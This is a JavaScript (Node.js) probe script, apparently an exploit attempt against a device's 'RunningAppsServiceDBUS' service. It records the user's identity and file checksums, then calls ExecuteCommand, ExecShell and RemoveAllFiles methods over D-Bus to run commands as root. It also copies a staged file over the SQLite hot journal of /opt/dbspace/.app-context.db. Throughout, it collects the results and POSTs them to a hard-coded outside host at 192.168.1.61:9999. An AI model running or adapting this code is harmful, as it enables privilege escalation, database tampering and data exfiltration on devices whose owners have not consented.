"use strict";

/* p97: RunningAppsService session-bus root commands */
var cp = null;
try { cp = require('child_process'); } catch (e) {}

var HOST = '192.168.1.61';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var RAS = 'com.native.RunningAppsServiceDBUS';
var RAS_PATH = '/com/native/RunningAppsServiceDBUS';
var R = { ts: new Date().toISOString(), probe: 'p97', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  try {
    var net = require('net');
    var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
    var s = net.connect(PORT, HOST);
    s.setTimeout(180000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 300000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p97info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  if (!cp) return '[no cp]';
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

function md5(p) { return run('md5sum ' + p + ' 2>&1; ls -la ' + p + ' 2>&1', 15000, 2000); }

function dbusCall(bus, iface, method, args) {
  return run('dbus-send --' + bus + ' --print-reply --dest=' + RAS + ' ' + RAS_PATH + ' ' + iface + '.' + method + ' ' + args + ' 2>&1', 30000, 2000);
}

function main() {
  R.results.s0_id = run('id; whoami; groups 2>&1', 10000, 500);
  R.results.s1_staged = md5(STAGED);
  R.results.s1c_live = md5(LIVE);
  R.results.s1d_jrn = md5(DST);
  L('init: staged=' + R.results.s1_staged.substring(0, 80));

  R.results.i_session = run('dbus-send --session --print-reply --dest=' + RAS + ' ' + RAS_PATH + ' org.freedesktop.DBus.Introspectable.Introspect 2>&1', 30000, 4000);
  R.results.i_system = run('dbus-send --system --print-reply --dest=' + RAS + ' ' + RAS_PATH + ' org.freedesktop.DBus.Introspectable.Introspect 2>&1', 30000, 4000);

  var ifaces = ['com.native.RunningApps_DBUS', 'com.native.RunningAppsServiceDBUS'];
  ifaces.forEach(function(iface, idx) {
    R.results['e1_'+idx] = dbusCall('session', iface, 'ExecuteCommand', 'string:"touch /opt/dbspace/p97test"');
    R.results['e2_'+idx] = dbusCall('session', iface, 'ExecuteCommand', 'string:"cp" string:"' + STAGED + '" string:"' + DST + '"');
    R.results['e3_'+idx] = dbusCall('session', iface, 'ExecuteCommand', 'string:"rm -f /opt/dbspace/.app-context.db-journal"');
    R.results['e4_'+idx] = dbusCall('session', iface, 'RemoveAllFiles', 'string:"/opt/dbspace/.app-context.db-journal"');
    R.results['e5_'+idx] = dbusCall('session', iface, 'ExecShell', 'string:"touch /opt/dbspace/p97test3"');
  });

  R.results.s2_ls = run('ls -la /opt/dbspace/ 2>&1 | head -30', 15000, 3000);
  R.results.s3_jrn = md5(DST);
  R.results.s3_live = md5(LIVE);

  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
